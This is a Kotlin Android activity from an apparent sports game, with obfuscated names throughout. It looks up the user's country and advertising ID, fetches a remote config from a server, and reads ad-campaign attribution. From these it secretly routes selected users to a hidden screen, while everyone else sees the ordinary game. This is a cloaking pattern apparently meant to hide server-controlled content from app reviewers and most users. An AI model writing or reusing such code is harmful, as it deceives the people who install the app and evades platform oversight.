package com.playgendary.sportmastersa.zdsga

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import android.content.Intent
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import com.playgendary.sportmastersa.zdsga.Mhsuiasd.Companion.qposldk
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import android.util.Log
import com.playgendary.sportmastersa.zdsga.Mhsuiasd.Companion.vkkdskosdkao
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.orhanobut.hawk.Hawk
import com.playgendary.sportmastersa.zdsga.Mhsuiasd.Companion.eeokadskoosdk
import com.playgendary.sportmastersa.bgfysu.AppRetroInst
import com.playgendary.sportmastersa.databinding.ActivityMainBinding
import com.playgendary.sportmastersa.nkiosa.Kiospdas
import com.playgendary.sportmastersa.zdsga.Mhsuiasd.Companion.alskaos

class MainActivity : AppCompatActivity() {
    lateinit var ksdjiasjid: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)


        ksdjiasjid = ActivityMainBinding.inflate(layoutInflater)
        setContentView(ksdjiasjid.root)
        GlobalScope.launch(Dispatchers.IO) {
            jkdjdajsia
        }

        AppsFlyerLib.getInstance()
            .init("FzBcU9WXSSwepWwbATcqz7", dodpsdopasopdopasd, applicationContext)
        AppsFlyerLib.getInstance().start(this)

    }

    private suspend fun nkkjdias(): String? {
        val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(AppRetroInst::class.java)

        val wpldkdsad = retrofitBuilder.lsodspkso().body()?.countryCode
        Log.d("Data", "countryCode: $wpldkdsad ")
        return wpldkdsad

    }

    private fun qosodsoadksd(){
        val vkskdasko = AdvertisingIdClient(applicationContext)
        vkskdasko.start()
        val wpsodlsad = vkskdasko.info.id
        Log.d("getAdvertisingId = ", wpsodlsad.toString())
        Hawk.put(alskaos, wpsodlsad)
    }


    private val dodpsdopasopdopasd = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            Hawk.put(eeokadskoosdk, dataGotten)
        }

        override fun onConversionDataFail(p0: String?) {
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }


    private val jkdjdajsia: Job = GlobalScope.launch(Dispatchers.IO) {
        val epsdoaoasdo: String = nkkjdias().toString()
        val dldkdfdfs = gjhijasdasi().toString()
        val ydyuusuhduassdua = Hawk.get(qposldk, "null")
        var wpsoadklaksdlklasdklasd: String? = Hawk.get(eeokadskoosdk)

        qosodsoadksd()
        if (ydyuusuhduassdua == "1") {
            val vjdsjsdkaj = Executors.newSingleThreadScheduledExecutor()
            vjdsjsdkaj.scheduleAtFixedRate({
                if (wpsoadklaksdlklasdklasd != null) {
                    Log.d("TestInUIHawk", wpsoadklaksdlklasdklasd.toString())
                    if (wpsoadklaksdlklasdklasd!!.contains("tdb2") || dldkdfdfs.contains(epsdoaoasdo)) {
                        Log.d("Apps Checker", "naming: $wpsoadklaksdlklasdklasd")
                        vjdsjsdkaj.shutdown()
                        startActivity(Intent(this@MainActivity, Jhssdjas::class.java))
                        finish()
                    } else {
                        vjdsjsdkaj.shutdown()
                        startActivity(Intent(this@MainActivity, Kiospdas::class.java))
                        finish()
                    }
                } else {
                    wpsoadklaksdlklasdklasd =  Hawk.get(eeokadskoosdk)
                    Log.d("TestInUIHawk", "Received null $wpsoadklaksdlklasdklasd")
                }

            }, 0, 2, TimeUnit.SECONDS)
        }
        else if (dldkdfdfs.contains(epsdoaoasdo)) {
            startActivity(Intent(this@MainActivity, Jhssdjas::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, Kiospdas::class.java))
            finish()
        }
    }


    private suspend fun gjhijasdasi(): String? {
        val lsodpsadp = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://celestialmagic.live/")
            .build()
            .create(AppRetroInst::class.java)

        val qpsldkksadsdk = lsodpsadp.tsyhsdhuas().body()?.view
        Log.d("Data", "getDataDev: $qpsldkksadsdk")
        val bjksdjasdi = lsodpsadp.tsyhsdhuas().body()?.appsChecker
        Hawk.put(qposldk, bjksdjasdi)
        Hawk.put(vkkdskosdkao, qpsldkksadsdk)
        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(vkkdskosdkao, "null")}")
        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(qposldk, "null")}")
        val lsdoksadji = lsodpsadp.tsyhsdhuas().body()?.geo
        Log.d("Data", lsdoksadji.toString())
        return lsdoksadji
    }


}